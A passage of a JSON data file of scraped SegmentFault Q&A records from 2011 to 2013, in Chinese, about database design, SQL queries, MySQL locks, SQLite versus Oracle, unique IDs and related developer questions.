      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098127\">\n<p>我们的设计非常简单，用了另外一个表专门来存放与第三方帐户的绑定，其实这个表的核心字段就是两个，一个是<code>我们网站的用户id</code>，一个是<code>用户在第三方网站的id</code>。</p><p>这样用户在用第三方帐号登录时，我们用oauth接口取到用户在第三方网站上的id，然后再从这个表中检索，这个id是否对应有我们网站的id。</p><p>如果有，那么就登录这个id的用户。</p><p>如果没有，那么为它注册一个新用户，并在绑定表中生成一条绑定纪录，以便下次登录查询。</p><p>用户要解除绑定就只需要把绑定纪录从绑定表中删除就行了。</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095524\">\n<p>在系统中账户、用户和登录认证的检查在数据存储层的结构是如何设计的呢，以及随后的认证和绑定（解除）的流程在设计中是如何解决的？</p>\n</div>",
      "favourite": "22",
      "glance": "9k",
      "tags": [
        "数据库",
        "segmentfault",
        "开放平台"
      ],
      "time": "2012-03-07",
      "title": "能介绍一下sf的第三方账号绑定、登录结合本地用户数据库的结构设计么？",
      "url": "https://segmentfault.com/q/1010000000095524"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000190751\">\n<ul>\n<li><p>任何一个系统，都是<strong>读</strong>远远大于<strong>写</strong>，因此，耗时的操作一般放在<strong>写</strong>，但是我并不建议在数据库里面存 html 文件，因为数据库要存放<strong>原始数据</strong>，毕竟这些数据需要反复编辑。</p></li>\n<li><p>为了提高<strong>读</strong>的性能，可以把 markdown 转换成的 html 放入缓存。</p></li>\n<li><p>这样还可以节省一次转换开销。</p></li>\n</ul>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098277\">\n<p>我有一个建议，两种格式都存放，现在的存储空间并不贵，只是多保存了一次，虽然有点违背原则，但有很多优点：</p><ol><li>展示的时候直接读取 html，速度很快，读的次数远远多于写的次数</li><li>编辑的时候读取 markdown，能减少诸如 XSS 之类的安全问题</li><li>代码只需写 markdown to html 部分，免去 html to markdown</li><li>即使将来 markdown 版本修改了，或者不再使用 markdown 了，旧的数据仍然能正常显示</li></ol><p>用空间换取效率，一气呵成。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098284\">\n<p>数据库保存markdown，html渲染放缓存。</p><p>我的项目里没有markdown，但是对用户输入涉及很多转换处理。把转换处理后的html放入redis，设置一个较长缓存时间1个月，这样就兼顾了原始输入的保留和渲染效率。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095612\">\n<p>有两种不同的方法：</p><ol><li>转成 html 格式保存进数据库，编辑的时候需要转换，读取的时候无需转换</li><li>直接保存原始语法格式，编辑的时候无需转换，读取的时候转换成 html</li></ol><p>这两种方法各有什么利弊，怎样选择呢？</p>\n</div>",
      "favourite": "3",
      "glance": "5k",
      "tags": [
        "markdown",
        "textile",
        "数据库"
      ],
      "time": "2012-03-29",
      "title": "数据库里如何存储 Markdown, Textile 这样的语法文本",
      "url": "https://segmentfault.com/q/1010000000095612"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095620\">\n<html><body>\n<p><img data-src=\"http://segmentfault.com/img/PYuHA\"/></p>\n<p>数据库表结构如图，一个文章可以有N个标签，标签和标签之间是树形结构。</p>\n<p>问：查询出所有tag.name='互联网' and tag.parentid='互联网'.Id 的 article.title和users.name</p>\n<p>不知道这个伪代码有没有表述清楚，就是说不只要查询出标签名称是‘互联网’的所有文章标题和用户名，还要符合‘互联网’的下一级所有标签，比如‘移动互联网’等等。</p>\n<p>请教大家这条SQL语句该怎么写，数据库是SQL server。 谢谢！</p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "2.9k",
      "tags": [
        "数据库",
        "表结构",
        "sqlserver"
      ],
      "time": "2012-03-31",
      "title": "关联4张表的SQL查询难题，还要尽可能考虑到性能",
      "url": "https://segmentfault.com/q/1010000000095620"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095812\">\n<pre>lock table test read;</pre><p>执行这句后，是不是表示允许其他进程读取该表，但不允许任何进程（包括自己）写（包括DELETE，UPDATE，INSERT）该表？</p><pre>lock table test read local;</pre><p>执行这句后，和上句一样，但是支持其他进程insert该表？</p><pre>lock table test write;</pre><p>执行这句后，是不是表示只允许当前进程操作该表，其他进程不允许任何对该表的操作，包括select，对么？</p><pre>lock table test;</pre><p>执行这句后，默认获得的是什么锁？读还是写？</p><p>追加：读锁支持多个进程同时申请吧？</p>\n</div>",
      "favourite": "0",
      "glance": "2.5k",
      "tags": [
        "数据库",
        "mysql",
        "锁"
      ],
      "time": "2012-06-06",
      "title": "关于mysql的LOCK疑问",
      "url": "https://segmentfault.com/q/1010000000095812"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000114900\">\n<p>`大家好，我遇到了一个关于EXCEPTION 和 SPECIFICITY这种情况的处理问题。因为这些EXCEPTIONs在一个非常大的系统里，而目前的程序解决方法都是if,else 或者类似的结构，非常繁琐。我的任务是找到一种方法把标准化和特殊化区分开，需要调用的时候再调用。对于现在的系统，举个例子，比如这个消息是发给这个用话，那么可能这个用户比较特别，在处理的时候就要考虑特殊性，可能就是用if,else来添加或者删除一些功能，但是这些步骤全部在主程序里完成，不是很好。大的系统是用C++写的，我现在想做一些插件去完成这些exceptions处理或者用数据库。但是不是很明确，希望得到各位朋友指点，不胜感激！！<br/>\n`</p><p>第一次在这提问，如有不当请多指教。</p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "exception",
        "编程",
        "数据库",
        "python",
        "c"
      ],
      "time": "2012-08-29",
      "title": "关于exception和specificity处理问题",
      "url": "https://segmentfault.com/q/1010000000114900"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000116630\">\n<p>这两个数据库不是一个级别的，不是很难选择把。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000116668\">\n<p>系统启动可以把变量加载到memcache应该满足你的需求吧？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000116440\">\n<p>既然不大（猜测需求类似偏好设置的东西），每次程序关掉或偏好设置修改时持久化成XML或json写入磁盘也好啊。<br/>\n读取十分频繁的话，还是放内存最好，只在程序关掉或偏好设置修改时做持久化工作。我是觉得这个需求随便用个持久化方式就可以，不一定非要用数据库</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000116390\">\n<p>我现在需要考虑两种类型的数据库，一种是直接用已经装好的ORACLE，一种是用SQLITE，两种数据库差别很大，所以有点迷茫。。我要管理的是一些特殊变量，这些变量本身在主程序里，但是为了优化，我把他们抽取出来，放在数据库里，这些变量集不大，但是会被多个线程使用，同时读取，所以我在想SQLITE能不能完成这样的工作呢，我们的这个主程序非常大</p>\n</div>",
      "favourite": "0",
      "glance": "4.9k",
      "tags": [
        "数据库",
        "sqlite",
        "oracle"
      ],
      "time": "2012-09-05",
      "title": "Sqlite 与 ORACLE 的比较",
      "url": "https://segmentfault.com/q/1010000000116390"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000117113\">\n<p>我想用ORACLE建一个简单的表，然后连接我的C++文件，做一些读写测试，由于对数据库了解不多，只用过sqlite，所以想请教下如何创建数据库，还有C++的接口怎么写呢，非常感谢。现在给我的电脑上有ORACLE，但我只看到有SQL PLUS和SQL DEVELOPER两个，没有找到可以创建数据库的DBCA，是不是我要自己下载一个呢。。。不懂。。谢谢</p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "oracle",
        "数据库",
        "接口",
        "c"
      ],
      "time": "2012-09-07",
      "title": "ORACLE 创建数据库",
      "url": "https://segmentfault.com/q/1010000000117113"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000117319\">\n<p>操作远程数据库，如何控制远程和本地的事务一致？</p>\n</div>",
      "favourite": "0",
      "glance": "2k",
      "tags": [
        "sqlserver",
        "数据库",
        "dblink"
      ],
      "time": "2012-09-10",
      "title": "关于SQL SERVER的DBLINK事务的问题。",
      "url": "https://segmentfault.com/q/1010000000117319"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000117362\">\n<p>现在有网站用户表，里面有个属性表示用户的积分。目前在0到一万之间分布。我现在想用一副统计图来表示出分布情况。<br/>\n1、请问大家用什么图表示比较好，柱状图还是？<br/>\n2、有什么现成可用的统计图实现方案？</p>\n</div>",
      "favourite": "1",
      "glance": "2k",
      "tags": [
        "数据库",
        "统计"
      ],
      "time": "2012-09-10",
      "title": "什么统计图实现方案比较好?",
      "url": "https://segmentfault.com/q/1010000000117362"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000118740\">\n<p>我现在想存50来个键值对，内容比较少，所以不想用MYSQL这样的数据库，我需要多次同时读取里面的值，最好便于查找，比如我要读第21个键值对，而且要能承受多次反复的读取，我的意思是强度挺大，现在想到的方法是CVS，XML，不知还有其他方法吗，如果有，请给出具体建议，非常感谢，需要有C++接口。 SQLITE我也试过，但不知它是否能承受多次同时查询？</p>\n</div>",
      "favourite": "0",
      "glance": "3.1k",
      "tags": [
        "键值对",
        "多次读取",
        "c++",
        "接口",
        "数据库"
      ],
      "time": "2012-09-18",
      "title": "大约50个键值对存储（需要方便C++接口读写，多次同时读取）",
      "url": "https://segmentfault.com/q/1010000000118740"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094758\">\n<p>RT。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>\n</div>",
      "favourite": "0",
      "glance": "2.3k",
      "tags": [
        "asp",
        "数据库"
      ],
      "time": "2011-07-13",
      "title": "什么工具可以从源码里提取图片文件 就象是ASP数据库文件",
      "url": "https://segmentfault.com/q/1010000000094758"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"\">\n</div>",
      "favourite": "5",
      "glance": "105",
      "tags": [],
      "time": "1970-01-01",
      "title": "",
      "url": "https://segmentfault.com/q/1010000000128414"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000142374\">\n<p><a href=\"http://segmentfault.com/q/1010000000142152\" rel=\"nofollow\" target=\"_blank\" title=\"http://segmentfault.com/q/10100000001...\">http://segmentfault.com/q/10100000001...</a></p><p>看URL，发现1010000000142152，所以想请教下这个编号的实现思路？感谢不吝赐教的人们。</p>\n</div>",
      "favourite": "11",
      "glance": "2.8k",
      "tags": [
        "数据库"
      ],
      "time": "2012-11-20",
      "title": "数据库唯一ID的实现思路",
      "url": "https://segmentfault.com/q/1010000000142374"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000146828\">\n<p>在 Win7 下 VS2005 中 VC 使用 ADO 连接数据库时字符集为非 Unicode ,连接代码如下:</p><pre>CoInitialize(NULL);\n_ConnectionPtr pConn(__uuidof(Connection));\n_RecordsetPtr pRst(__uuidof(Recordset));\npConn-&gt;ConnectionString=\"Provider=SQLOLEDB.1;Persist Security Info=False;User ID=sa;Password=123123;Initial Catalog=MyTest;Data Source=KANG-PC\\SQL2005\";\n//需连接数据库: MyTest\n//服务器名: KANG-PC\\SQL2005\n//登陆用户: sa\n//登入密码: 123123\npConn-&gt;Open(\"\",\"\",\"\",adConnectUnspecified);</pre><p>连接字符串是在 VB 中利用 Microsoft Ado Data Control 控件中取得,并成功连接数据库.(记得在以前用 VC6.0 时候利用这个字符串就可以连接数据库了),可是这里出现错误.由 try catch 捕获到的错误信息:</p><pre>未指定的错误 //由 e.ErrorMessage() 获得\n012FEF78 //由 e.ErrorInfo() 获得\n[DBNETLIB][ConnectionOpen (Connect()).]SQL Server 不存在或拒绝访问。//由 e.Description() 获得</pre>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "visual-studio",
        "c++",
        "数据库"
      ],
      "time": "2012-12-01",
      "title": "VC 利用 ADO 连接数据库问题",
      "url": "https://segmentfault.com/q/1010000000146828"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000155580\">\n<p>垂直搜索引擎用什么存储索引记录比较适合？</p>\n</div>",
      "favourite": "0",
      "glance": "1.8k",
      "tags": [
        "数据库"
      ],
      "time": "2012-12-24",
      "title": "垂直搜索引擎用什么存储索引记录比较适合？",
      "url": "https://segmentfault.com/q/1010000000155580"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000164796\">\n<p><strong>需求：</strong></p><p>数据库表X,字段如下：<br/>\nProductId:bigint (自动生成的ID)<br/>\nCommissionNum:bigint (累计的销量)</p><p>逻辑如下：<br/>\n1.好商品是按照CommissionNum倒序排列的<br/>\n2.每天会新增商品，新商品的ProductId是自增的<br/>\n3.所有的顾客看到的商品是一样的</p><p>需要一个可以简单实施的算法，不需要完美的解决方案，达到以下要求：<br/>\n1.以CommissionNum为参照，向顾客推荐好商品<br/>\n2.让每天的新商品可以冒出来，而不是一成不变的list，让顾客感觉到商品的变化<br/>\n3.最好能在数据库语句解决，实在不行，可以取出在内存中二次排序</p><p>希望大家能给个思路或者解决方案噢，感谢各位 :-)</p>\n</div>",
      "favourite": "1",
      "glance": "2.4k",
      "tags": [
        "数据库",
        "数据查询"
      ],
      "time": "2013-01-24",
      "title": "求一个数据库查询排序算法",
      "url": "https://segmentfault.com/q/1010000000164796"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000167313\">\n<p>新手轻喷。小弟在看head first 的 PHP &amp; MySQL，第二章用命令行创建数据库：</p><pre>tony@Tony-Laptop-Ubuntu$ ~ mysql\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 41\nServer version: 5.5.29-0ubuntu0.12.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; CREATE DATABASE aliendatabase;\nERROR 1044 (42000): Access denied for user ''@'localhost' to database 'aliendatabase'</pre><p>求大神解释加解决方案～小弟拜谢！</p>\n</div>",
      "favourite": "0",
      "glance": "5.6k",
      "tags": [
        "mysql",
        "数据库",
        "php"
      ],
      "time": "2013-01-29",
      "title": "MySQL: ERROR 1044 (42000) Access denied for user ''@'localhost' to database 'aliendatabase'",
      "url": "https://segmentfault.com/q/1010000000167313"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000170482\">\n<p>50w数据量，存储的都是3~5条小数据，如name，id等等，用mysql会出现性能瓶颈吗？<br/>\n或者说，除了mysql，还有什么比较好的方案呢，或者应该对于mysql做怎么样的优化？</p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "mysql",
        "数据库",
        "数据库设计",
        "数据库性能优化"
      ],
      "time": "2013-02-08",
      "title": "50w数据量，存储的是3~5条小数据，如id等，用mysql会出现性能瓶颈吗？",
      "url": "https://segmentfault.com/q/1010000000170482"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000170917\">\n<p>比如symfony2中的例子:</p><pre>Ens\\JobeetBundle\\Entity\\CategoryAffiliate:\n  type: entity\n  table: category_affiliate\n  id:\n    id:\n      type: integer\n      generator: { strategy: AUTO }\n  manyToOne:\n    category:\n      targetEntity: Category\n      inversedBy: category_affiliates\n      joinColumn:\n        name: category_id\n        referencedColumnName: id\n    affiliate:\n      targetEntity: Affiliate\n      inversedBy: category_affiliates\n      joinColumn:\n        name: affiliate_id\n        referencedColumnName: id</pre><p>比较详尽的解释如generator这个option，以及manyToOne和OneToMany的option的文档<br/>\ndoctrine官网我找到的并不太清楚</p>\n</div>",
      "favourite": "0",
      "glance": "1.9k",
      "tags": [
        "symfony",
        "数据库"
      ],
      "time": "2013-02-15",
      "title": "有没有doctrine yaml定义数据库shema的比较详尽的文档？",
      "url": "https://segmentfault.com/q/1010000000170917"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000171344\">\n<p>当项目越来越大，数据量越来越多，模块越来越复杂的情况下，我想同时操作好多数据库（很可能是还跨越不同数据库产品）很常见。<br/>\n如何能够在跨库时保证事务操作（原子操作）呢？<br/>\n希望听听大家的意见~</p>\n</div>",
      "favourite": "1",
      "glance": "3.5k",
      "tags": [
        "数据库"
      ],
      "time": "2013-02-18",
      "title": "如何实现跨库的事务操作",
      "url": "https://segmentfault.com/q/1010000000171344"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000178576\">\n<html><body><p><img data-src=\"http://segmentfault.com/img/bVUCp\"><br>\n这个Size是在内存里面最好吗？<br>\nwhy会有数据大小,索引大小,存储大小<br>\n但是 那个5.95G是神马 怎么会比上边加起来还大很多。。<br>\n内存是比5.95g还大<br>\n还是比Data Size (或者加上索引数据大小)大就可以了？</br></br></br></br></br></img></p></body></html>\n</div>",
      "favourite": "0",
      "glance": "5.1k",
      "tags": [
        "mongodb",
        "nosql",
        "数据库"
      ],
      "time": "2013-03-14",
      "title": "mongodb 内存大小和数据大小关系",
      "url": "https://segmentfault.com/q/1010000000178576"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000181163\">\n<p>目前用的是MYSQL，明显感到很多瓶颈。比如某个数据表 tbl_biao有3个字段a,b,c</p><p>a当中存的user，是索引字段<br/>\nb当中存储的是json数据[1,2,3,4,5,6,7......]<br/>\nc当中存储的也是json数据[\"11\":\"1100000000\",\"22\":\"1200000000\"......]</p><p>数据总量大约200000条</p><p>现在有一个需求是按照b字段当中的第二个和第四个json参数来排序，MYSQL无法实现<br/>\n还有一个需求是查找所有c字段当中包含key=22的user，并且按照对应的值（时间戳）来排序</p><p>类似的需求很多，MYSQL都无法实现，虽然可以把JSON拆成字段来搞，但是我的数据量是在太多了...<br/>\n现在准备换数据库，求推荐。</p>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2013-03-21",
      "title": "请问在这样的应用场景下，我该选择什么数据库",
      "url": "https://segmentfault.com/q/1010000000181163"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000182323\">\n<p>什么是事务？<br/>\n什么数据库支持事务，什么数据库不支持事务？<br/>\n支持事务的数据库有何优势，适用于什么场景？</p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "数据库"
      ],
      "time": "2013-03-25",
      "title": "支持事务的数据库适用于何种场景？",
      "url": "https://segmentfault.com/q/1010000000182323"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000203626\">\n<p>直接通过 python的连接字符串生成查询语句，有可能会有sql注入的危险。</p>\n<p>如果，只生成单条查询，注意点的话，连接字符串组合成查询语句，危险性大不大？好像应该也没什么问题</p>\n<p>如果使用 “？”占位符的话，感觉很不灵活不方便。</p>\n<p>比如,多个key<br/>\n<code>select * from table</code><br/>\n<code>select id,name from table</code> </p>\n<p>这里使用占位符,貌似不能这么用。 </p>\n<pre><code>args= ('name','xxx')\nc.execute('select * from stocks where ？=?', args)\n</code></pre>\n<p>还有生成查询语句比较好的实践应该是怎样的？</p>\n<p>（字符串连接成查询语句，要带入的查询的值使用占位符？？还是直接固定死了，尽量不要抽象话）</p>\n</div>",
      "favourite": "2",
      "glance": "4.3k",
      "tags": [
        "python",
        "sqlite",
        "数据库"
      ],
      "time": "2013-05-21",
      "title": "数据库查询语句的生成，以及占位符使用的疑问",
      "url": "https://segmentfault.com/q/1010000000203626"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000203775\">\n<p>两者的优缺点是什么，怎么实现把图片上传后，把路径图片名存到MYSQL中</p>\n</div>",
      "favourite": "1",
      "glance": "4.1k",
      "tags": [
        "数据库",
        "php",
        "上图片"
      ],
      "time": "2013-05-22",
      "title": "直接把图片存在MYSQL数据库上与只存上存图片的路径和图片名有什么区别",
      "url": "https://segmentfault.com/q/1010000000203775"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000206897\">\n<p>系统升级时，需要将一个sqlserver的所有库进行备份，想通过powershell应该可以实现吧。有没有大侠做过的？</p>\n</div>",
      "favourite": "1",
      "glance": "1.4k",
      "tags": [
        "数据库",
        "sqlserver",
        "powershell"
      ],
      "time": "2013-05-31",
      "title": "如何使用powershell 进行mssqlserver批量备份",
      "url": "https://segmentfault.com/q/1010000000206897"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000206961\">\n<p>各位大牛.有大批量的数据需要进行分析和统计.</p>\n<p>用activerecord处理时会有大量的查询操作.</p>\n<p>在时间和性能不太满意.我想可以把数据全部读到内存中然后再处理这些数据</p>\n<p>有哪些比较好的方案来处理这种事情呢?</p>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "ruby",
        "ruby-on-rails",
        "数据库"
      ],
      "time": "2013-05-31",
      "title": "activerecord做数据统计?",
      "url": "https://segmentfault.com/q/1010000000206961"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000207363\">\n<p>最近启动了一个新项目，类似于百度统计、友盟一类的数据分析产品。</p>\n<p>产品中大量使用count,groupby一类的聚合查询(按日期组织PV,UV,销售额一类的)，现在page_visit表数据量过百万后服务器已经稍显吃力，搭档的建议是增加缓存表，就是每天把用户的数据都算一遍，用户查询时直接从缓存表中取数据。但是缓存表带来的额外工作量会比较大，维护成本也高。</p>\n<p><strong>所以想请教下百度统计、友盟一类的数据库是如何设计的？</strong></p>\n<blockquote>\n<p>部分表结构\n  page_visit表:\n  id,storeID,productID,title,ip,country,city,url,referUrl,browser,createTime,os...\n  每一次访问都会插入一条新的记录。</p>\n<p>store表：\n  id,userID,name,email...</p>\n<p>product表：\n  id,storeID,title,price,size,color...</p>\n</blockquote>\n</div>",
      "favourite": "2",
      "glance": "3.1k",
      "tags": [
        "database-engine",
        "数据库",
        "数据库设计",
        "php"
      ],
      "time": "2013-05-31",
      "title": "请教下百度统计一类分析服务的数据库设计",
      "url": "https://segmentfault.com/q/1010000000207363"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000207672\">\n<p>表user的内容  </p>\n<pre><code>user_id user_hobby_1 user_hobby_2 user_hobby_3   \n1       唱歌         看书          跳舞  \n2       书法         唱歌          钢琴  \n3       看书         唱歌          美食\n</code></pre>\n<p>预期得到的结果  </p>\n<pre><code>[1]唱歌[2]看书[3]……\n</code></pre>\n<p>就是在hobby1-3三个字段中重复出现次数最多的记录按次数降序查询。</p>\n<p>本人小白。望牛人指点。</p>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "mysql",
        "sql",
        "数据库"
      ],
      "time": "2013-06-01",
      "title": "mysql实现查询表中不同字段重复记录的次数？",
      "url": "https://segmentfault.com/q/1010000000207672"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000208692\">\n<p>不用long存储用字符串更耗空间吧，64位才8个byte\n1.时间戳可以定义成一个过去的时间到现在的毫秒数，例如2010年，这样位数不多,48位足够\n2.剩余几位用每个机器编个号，每个进程/线程编个号，应该不会超过64位</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000207915\">\n<p>为什么不直接根据邮箱生成一个自增的uid呢?</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000207989\">\n<p>java: UUID.randomUUID().toString();</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000207912\">\n<p>可知的用户资料只有邮箱，由于app可以离线使用，所以想要为他新建的内容加一个唯一的索引，用于同步，他可能同一个帐号在不同的设备上离线增加内容。</p>\n<p>这个唯一的索引，最好是个数字。</p>\n<p>目前是用时间戳加随机数以及email的位数，但生成出来的数字太长了，一定要用long储存，十分不便，大家有无更好的办法，尽量不重复，越短越好。</p>\n<p>如果数字是在无法控制在 <code>(int)2147483647</code> 的范围内，用字符串也可以，尽量的短就好了。</p>\n</div>",
      "favourite": "4",
      "glance": "2.4k",
      "tags": [
        "app",
        "数据库",
        "ios",
        "android",
        "程序员"
      ],
      "time": "2013-06-01",
      "title": "多用户同时间离线不联网的状态下生成公用同一个表的唯一ID",
      "url": "https://segmentfault.com/q/1010000000207912"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000210469\">\n<p>Mysql数据库吗？ 或者MongoDB? Redis? </p>\n<p>求教。 </p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "数据库",
        "segmentfault"
      ],
      "time": "2013-06-07",
      "title": "求教：segmentfault使用什么数据库作为主存储呢？",
      "url": "https://segmentfault.com/q/1010000000210469"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000262285\">\n<p>mybatis自动提供了一级和二级缓存（需要配置打开），强大的动态sql，自动化的session管理，都比手工维护来的方便和安全</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000213150\">\n<p>面向对象的开发效率会更高，毕竟可以自动生成数据库表的Model对象，少写一些基本sql。建议使用，不管是否团队作业</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000213340\">\n<p>1、DAO层代码可以通过现有插件直接生成，大大提高编码效率和准确性(相比手工coding的失误等)；<br/>\n2、mybatis已有的连接池管理，缓存管理等所带来的代码性能优势和可靠性(作为一个工业级的开源框架，其代码是久经考验的)；<br/>\n3、一致的编码风格大大减少了代码的沟通交流成本；</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000211552\">\n<p>使用mybatis与直接用jdbc相比，有哪些优势？\n如果不涉及团队合作，有必要使用mybatis吗？</p>\n</div>",
      "favourite": "0",
      "glance": "7.7k",
      "tags": [
        "java",
        "java-ee",
        "数据库"
      ],
      "time": "2013-06-11",
      "title": "使用mybatis与直接用jdbc相比，有哪些优势？",
      "url": "https://segmentfault.com/q/1010000000211552"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000241355\">\n<p>对数据库操作了解不多，想在flask应用中使用sqlite<br/>\n已经建立数据库</p>\n<p>链接数据库用的函数为：</p>\n<pre><code>def connect_db():\n    return sqlite3.connect('/path/to/database.db')\n</code></pre>\n<p>相关请求函数：</p>\n<pre><code>@app.before_request\ndef before_request():\n    g.db = connect_db()\n\n@app.teardown_request\ndef teardown_request(exception):\n    if hasattr(g, 'db')\n        g.db.close()\n</code></pre>\n<p>如何实现查询，新增，修改等操作？先谢啦~！</p>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "sqlite",
        "flask",
        "数据库",
        "python"
      ],
      "time": "2013-06-20",
      "title": "关于flask中使用sqlite",
      "url": "https://segmentfault.com/q/1010000000241355"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000249868\">\n<p>用文件，一个文件对应一个聊天对象</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000250044\">\n<p>coredata,sqlite,文件 都行 看你用什么顺手</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000250143\">\n<p>QQ 和微信的 sqlite 文件都是未加密的，可以打开看一下表结构参考。一般历史数据 sqlite 存档，最近联系人列表带一条最后消息则是 plist 简单存储。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000247531\">\n<p>除了表之外其他的存储方式也可以，现在没有思路不知道该如何设计。</p>\n</div>",
      "favourite": "1",
      "glance": "4.4k",
      "tags": [
        "ios",
        "数据库"
      ],
      "time": "2013-06-26",
